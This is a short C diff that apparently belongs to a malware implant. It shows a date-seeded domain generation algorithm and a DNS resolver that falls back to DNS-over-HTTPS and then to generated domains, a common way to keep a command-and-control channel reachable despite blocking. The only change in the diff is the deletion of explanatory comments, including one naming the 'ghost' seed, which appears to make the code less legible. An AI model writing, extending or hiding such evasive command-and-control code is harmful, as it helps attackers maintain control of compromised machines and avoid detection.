@@ -38,12 +38,12 @@ int ph_dns_dga_generate(char *domain, size_t len, int day_offset)
     time_t now = time(NULL) + (day_offset * 86400);
     struct tm *tm_info = gmtime(&now);
     
-    // Seed: ghost-YYYYMMDD
+    
     char seed[16];
     snprintf(seed, sizeof(seed), "gh%04d%02d%02d", 
              tm_info->tm_year + 1900, tm_info->tm_mon + 1, tm_info->tm_mday);
 
-    // Simple hash for DGA
+    
     uint32_t h = 0x811c9dc5;
     for (int i = 0; seed[i]; i++) {
         h ^= (uint32_t)seed[i];
@@ -345,13 +345,13 @@ int ph_dns_resolve(ph_dns_result_t *result, const char *hostname,
         }
     }
 
-    // Fallback 1: DoH (Cloudflare)
+    
     if (ph_dns_doh_resolve(result, hostname, "1.1.1.1") == PH_OK) {
         result->method_used = PH_DNS_METHOD_DOH;
         return PH_OK;
     }
 
-    // Fallback 2: DGA
+    
     char dga_domain[PH_DNS_MAX_DOMAIN_LEN];
     ph_dns_dga_generate(dga_domain, sizeof(dga_domain), 0);
     if (ph_dns_resolve(result, dga_domain, config) == PH_OK) {
